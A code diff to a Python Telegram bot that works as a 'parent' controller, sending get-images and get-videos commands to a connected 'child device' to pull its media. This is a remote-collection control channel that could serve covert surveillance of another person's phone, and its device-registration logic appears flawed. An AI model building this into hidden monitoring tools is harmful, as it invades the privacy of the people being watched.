@@ -10,39 +10,59 @@ AUTHORIZED_PARENT_IDS = {8032922682}  # your Telegram ID
 
 client = TelegramClient('parent_session', API_ID, API_HASH)
 
+# Store child device chat ID after connection
+child_chat_id = None
+media_message_id = None
+
 @client.on(events.NewMessage(incoming=True))
 async def handler(event):
+    global child_chat_id, media_message_id
+
+    # Only respond to parent
     if event.sender_id not in AUTHORIZED_PARENT_IDS:
         await event.respond("Unauthorized sender.")
         return
 
     text = (event.raw_text or "").strip().lower()
+
+    # Initial start
     if text == "/start":
-        await event.respond(
-            "Parent bot online. Waiting for child device.",
+        await event.respond("Parent bot online ✅\nWaiting for child device...")
+
+    # Detect child device connection
+    elif "device connected" in text:
+        child_chat_id = event.sender_id  # store child device chat ID
+        # Send “Receive Media” button
+        msg = await event.respond(
+            "Child device connected ✅\nSelect an action:",
+            buttons=[[Button.inline("Receive Media", b"receive_media")]]
+        )
+        media_message_id = msg.id
+
+@client.on(events.CallbackQuery)
+async def callback(event):
+    global child_chat_id, media_message_id
+
+    if event.sender_id not in AUTHORIZED_PARENT_IDS:
+        await event.answer("Unauthorized", alert=True)
+        return
+
+    # Step 2: Receive Media button clicked
+    if event.data == b"receive_media":
+        await event.answer("Choose media type")
+        await client.edit_message(
+            child_chat_id,
+            media_message_id,
+            "Select media type to receive:",
             buttons=[
                 [Button.inline("Get Images", b"get_images")],
                 [Button.inline("Get Videos", b"get_videos")]
             ]
         )
 
-@client.on(events.CallbackQuery)
-async def callback(event):
-    if event.sender_id not in AUTHORIZED_PARENT_IDS:
-        return
-
-    if event.data == b"get_images":
-        await event.answer("Command sent: get images ✅")
-        # Here you can trigger your child script to send images
-
-    elif event.data == b"get_videos":
-        await event.answer("Command sent: get videos ✅")
-        # Trigger your child script to send videos
-
-async def main():
-    await client.start(bot_token=BOT_TOKEN)
-    print("Parent bot started and listening...")
-    await client.run_until_disconnected()
-
-if __name__ == "__main__":
-    asyncio.run(main())
+    # Step 3: Get Images / Get Videos clicked
+    elif event.data in [b"get_images", b"get_videos"]:
+        command = b"get_images" if event.data == b"get_images" else b"get_videos"
+        await event.answer(f"Command sent to child: {command.decode()} ✅")
+        if child_chat_id:
+            await client.send_message(child_chat_id, f"!{command.decode()}")
